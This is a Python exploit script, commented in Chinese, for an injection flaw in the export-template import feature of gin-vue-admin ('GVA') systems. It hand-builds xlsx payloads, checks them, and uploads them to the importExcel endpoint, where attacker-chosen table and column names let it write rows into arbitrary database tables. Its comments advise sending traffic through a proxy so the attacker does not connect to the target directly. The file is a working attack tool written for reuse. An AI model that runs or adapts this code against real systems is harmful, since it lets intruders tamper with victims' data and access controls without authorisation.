#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GVA 系「导出模板导入」注入的最小可用工具包。

存在理由:曾用只手写第一个单元格的 xlsx 生成器,把"多列写不进去"误判成
**目标限制**,白绕一大圈(见 references/multicol-insert-truth-and-casbin-cache.md)。
本文件把正确实现固化下来 —— 逐单元格写入 + 发送前自检。**别再手搓第二遍。**

三个函数:
  make_xlsx(rows)                手写 OOXML 生成 xlsx(逐格写,含正确 A1/B1 引用)
  verify(payload)                openpyxl 读回校验 (行数, 列数) —— 发之前必跑
  import_rows(post, ...)         上传并触发 importExcel 注入

映射关系(实测):
  表名   ← tableName 字段(完全可控)
  列名   ← templateInfo 的 KEY(完全可控)
  值     ← xlsx 数据单元格;第 1 行是表头,必须匹配 templateInfo 的 VALUE(标签)
"""
import io
import zipfile
import xml.sax.saxutils as sx

MIME = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"

_CT = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    '</Types>'
)
_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
    '</Relationships>'
)
_WB = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
)
_WRELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    '</Relationships>'
)


def _col(i):
    """0 -> A, 1 -> B, 25 -> Z, 26 -> AA ..."""
    s, i = "", i + 1
    while i:
        i, r = divmod(i - 1, 26)
        s = chr(65 + r) + s
    return s


def make_xlsx(rows):
    """rows = [[表头...], [数据...], ...] —— 每个单元格都写,带正确引用。"""
    body = []
    for ri, row in enumerate(rows, start=1):
        cells = "".join(
            '<c r="%s%d" t="inlineStr"><is><t>%s</t></is></c>'
            % (_col(ci), ri, sx.escape(str(v)))
            for ci, v in enumerate(row)
        )
        body.append('<row r="%d">%s</row>' % (ri, cells))
    sheet = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        '<sheetData>%s</sheetData></worksheet>' % "".join(body)
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _CT)
        z.writestr("_rels/.rels", _RELS)
        z.writestr("xl/workbook.xml", _WB)
        z.writestr("xl/_rels/workbook.xml.rels", _WRELS)
        z.writestr("xl/worksheets/sheet1.xml", sheet)
    return buf.getvalue()


def verify(payload, expect_cols=None, expect_rows=None):
    """发出去之前自检:返回 (行数, 列数) 并打印实际内容。

    怀疑目标之前,先量自己的包 —— 这一步能省掉一整轮误判。
    """
    import openpyxl
    ws = openpyxl.load_workbook(io.BytesIO(payload)).active
    got = (ws.max_row, ws.max_column)
    for row in ws.iter_rows(values_only=True):
        print("   ", row)
    if expect_cols is not None and got[1] != expect_cols:
        raise AssertionError("列数不对: 期望 %s 实际 %s(典型病因:生成器只写了 r[0])"
                             % (expect_cols, got[1]))
    if expect_rows is not None and got[0] != expect_rows:
        raise AssertionError("行数不对: 期望 %s 实际 %s" % (expect_rows, got[0]))
    return got


def import_rows(post, base, template_id, payload, headers, name=None):
    """触发 importExcel 注入。

    post: requests.post 之类(记得带上代理会话,别裸连目标)
    base: 形如 https://host/api
    """
    name = name or template_id
    url = "%s/sysExportTemplate/importExcel?templateID=%s&name=%s" % (
        base, template_id, name)
    return post(url, headers=headers,
                files={"file": ("x.xlsx", payload, MIME)}, timeout=60)


if __name__ == "__main__":
    p = make_xlsx([["A", "B", "C"], ["1", "2", "3"]])
    print("自检:", verify(p, expect_cols=3, expect_rows=2), "字节:", len(p))
